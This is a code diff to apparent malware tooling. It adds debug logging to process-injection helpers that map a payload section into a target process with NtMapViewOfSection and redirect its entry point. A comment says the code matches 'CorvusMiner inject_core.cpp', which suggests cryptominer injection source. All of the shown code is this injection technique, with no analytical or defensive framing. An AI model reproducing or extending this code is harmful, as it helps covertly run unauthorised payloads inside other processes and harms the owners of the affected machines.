@@ -39,11 +39,18 @@ PVOID map_section_into_process(HANDLE hProcess, HANDLE hSection, DWORD payload_s
         return nullptr;
     }
 
+    printf("[injection_helpers] map_section_into_process called: hProcess=%p, hSection=%p, payload_size=%lu\n", 
+           hProcess, hSection, payload_size);
+
     SIZE_T view_size = 0;
     PVOID base_address = 0;
 
     /* Exact match of map_buffer_into_process from CorvusMiner inject_core.cpp */
+    printf("[injection_helpers] Calling NtMapViewOfSection with ViewShare=2, PAGE_READONLY\n");
     long status = g_NtMapViewOfSection(hSection, hProcess, &base_address, NULL, NULL, NULL, &view_size, 2, NULL, PAGE_READONLY);
+    printf("[injection_helpers] NtMapViewOfSection returned: status=0x%lX, base_address=%p, view_size=0x%llX\n", 
+           (unsigned long)status, base_address, (ULONGLONG)view_size);
+    
     if (status != 0) {
         /* STATUS_IMAGE_NOT_AT_BASE (0x40000003) is a warning, not fatal */
         if ((ULONG)status == 0x40000003) {
@@ -64,6 +71,9 @@ PVOID map_section_into_process(HANDLE hProcess, HANDLE hSection, DWORD payload_s
 
 bool redirect_entry_point(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION& pi)
 {
+    printf("[injection_helpers] redirect_entry_point called: loaded_pe=%p, load_base=%p, hThread=%p\n", 
+           loaded_pe, load_base, pi.hThread);
+    
     /* Calculate VA of entry point */
     DWORD ep_rva = get_entry_point_rva(loaded_pe);
     ULONGLONG ep_va = (ULONGLONG)load_base + ep_rva;
